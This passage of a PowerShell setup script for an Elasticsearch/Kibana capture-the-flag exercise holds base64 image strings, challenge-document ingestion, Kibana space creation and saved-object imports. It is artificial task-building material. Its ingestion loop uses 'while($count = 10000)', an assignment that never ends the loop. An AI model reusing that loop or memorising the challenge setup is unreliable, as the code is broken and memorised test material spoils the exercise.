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"
)
                } | ConvertTo-Json

                Invoke-Ingest-Elasticsearch-Documents -documentToIngest $challenge5_12 -customUrl $ingestIndexIDURL
                Invoke-Ingest-Elasticsearch-Documents -documentToIngest $challenge6
                $count = 0
                do{
                    Invoke-Ingest-Elasticsearch-Documents -documentToIngest $challenge9
                    $count++
                }while($count = 10000)
                Invoke-Ingest-Elasticsearch-Documents -documentToIngest $challenge10

                
                # Import Kibana CTF Space
                Invoke-Create-Kibana-CTF-Space $Kibana_URL

                # Import the Saved Objects
                Write-Host "Last step! Importing saved objects to the Kibana CTF Space." -ForegroundColor DarkMagenta
                Import-SavedObject "./Discover/1.ndjson"
                Import-SavedObject "./Discover/2.ndjson"
                Import-SavedObject "./Discover/3-4-7.ndjson"
                Import-SavedObject "./Discover/5.ndjson"
                Import-SavedObject "./Discover/8.ndjson"
                Import-SavedObject "./ES_QL/11.ndjson"
                Import-SavedObject "./ES_QL/12.ndjson"
                Import-SavedObject "./ES_QL/13.ndjson"
                Import-SavedObject "./ES_QL/14.ndjson"
                Import-SavedObject "./ES_QL/15.ndjson"
                
                Write-Host "Object imported." -ForegroundColor Green

                $finished = $true
                break
            }
            '6' {
                # 6. Reset Elastic Stack
